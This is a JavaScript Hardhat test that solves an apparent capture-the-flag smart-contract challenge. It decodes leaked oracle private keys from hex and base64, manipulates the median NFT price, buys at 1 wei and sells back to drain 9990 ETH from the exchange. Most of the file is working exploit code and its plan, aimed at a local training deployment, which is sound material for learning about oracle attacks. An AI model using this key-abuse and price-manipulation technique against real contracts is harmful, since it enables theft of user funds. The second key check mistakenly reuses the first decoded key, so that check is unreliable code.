const { expect, assert } = require('chai');
const { ethers } = require('hardhat');
const ethUtil = require('ethereumjs-util');
const ethWallet = require('ethereumjs-wallet').default;

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {
      /**
       * @dev
       * The goal is to drain the 9990 ETH held on the exchange, starting with 0.1 ETH in our attacker wallet.
       * The buy and sell functions of the exchange are non reentrant, preventing us from performing any re-entrancy attack that could drain the ETH from the contract.
       * The most simple way we can perform the attack is to manipulate the oracles to decrease the NFT price before purchasing them, then increasing it enough before selling them to the exchange against all its ETH.
       * Because the exchange sets the price as the median price given by the oracles, we need to manipulate at least 2 of these oracles.
       * Now how can we access two of these oracles? We would need their private keys, but how? The title of the challenge gives us a hint, and we also have these mysterious hex bytes received from the server...
       * Let us decode the two hex bytes numbers we are given at the beginning of the challenge into 32-byte strings . When we create wallets using the decoded strings, we obtain two of the oracles addresses! The hex bytes numbers correspond to the private keys of those oracles.
       * Now that we have access to these oracles, we can perform our attack:
       * -call postPrice() on both oracles to drop the NFT price to 0.
       * -call buyOne() on the exchange from our attacker.
       * -call postPrice() on both oracles to increase the NFT price to 9990 ETH.
       * -call sellOne() on the exchange from our attacker.
       * -call postPrice() on both oracles to drop the NFT price to 999 ETH (the last success condition is to have the same NFT price as the beginning!)
       * 
       */
      //decode privatekeys:
      const decode = (hexdata) => {
        const step1 = Buffer.from(hexdata.split(' ').join(''), 'hex').toString(
          'utf8'
        );
        const step2 = Buffer.from(step1, 'base64').toString('utf8');
        return step2;
      };

      const hexdata1 = [
        decode(
          '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35'
        ),
        decode(
          '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'
        ),
      ];

      //check to see if the hex bytes correspond to the private keys of the oracles
      const checkAddress = (_address) => {
        let isThere = false;
        for (oracle of sources) {
          if (_address == oracle) {
            return isThere = true;
          }
        }
        return isThere;
      };
      const walletDecoded1 = new ethers.Wallet(hexdata1[0], ethers.provider);
      assert(
        checkAddress(walletDecoded1.address),
        '\u001b[1;31mthe first decoded hex bytes is a random string'
      );
      console.log(
        '\u001b[1;36mThe first decoded hex bytes was the private key of one of the oracles!'
      );

      const walletDecoded2 = new ethers.Wallet(hexdata1[0], ethers.provider);
      assert(
        checkAddress(walletDecoded2.address),
        '\u001b[1;31mthe second decoded hex bytes is a random string'
      );
      console.log(
        '\u001b[1;36mThe second decoded hex bytes was the private key of one of the oracles!'
      );

      const postPrice = async (price) => {
        for (key of hexdata1) {
          const walletOracle = new ethers.Wallet(key, ethers.provider);
          const walletOracleTrust = this.oracle.connect(walletOracle);
          await walletOracleTrust.postPrice('DVNFT', price);
        }
      };

      await postPrice(0);
      console.log(`\u001b[1;35mBuying one NFT at the price of 1 wei`);
      await this.exchange.connect(attacker).buyOne({ value: 1 });
      //EVENT LOGGING
      // use the event emitted upon purchase to get the tokenId
      let abi = [
        'event TokenBought(address indexed buyer, uint256 tokenId, uint256 price)',
      ];
      let iface = new ethers.utils.Interface(abi);
      var filter = {
        address: this.exchange.address,
        fromBlock: 0,
      };
      var logPromise = await ethers.provider.getLogs(filter);
      const eventResult = iface.parseLog(logPromise[0]);
      const tokId = eventResult.args.tokenId;
      console.log(
        `\u001b[1;32mthe tokenID is ${ethers.utils.formatUnits(tokId, 0)}`
      );

      //check attacker now owns the NFT
      const _owner = await this.nftToken.connect(attacker).ownerOf(tokId);
      assert(
        _owner === attacker.address,
        '\u001b[1;31mthe attacker does not own the NFT!'
      );
      console.log(`\u001b[1;36mthe attacker owns the NFT!`);

      //change NFT price to 9990 ETH and sell it
      console.log(`\u001b[1;35mChanging price of NFT to 9990 ETH`);  
      await postPrice(EXCHANGE_INITIAL_ETH_BALANCE);

      await this.nftToken
        .connect(attacker)
        .approve(this.exchange.address, tokId);
      console.log(`\u001b[1;35mSelling one NFT at the price of 9990 ETH`);
      await this.exchange.connect(attacker).sellOne(tokId);

      // //bring NFT price back to initial price.
      await postPrice(INITIAL_NFT_PRICE);
      /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
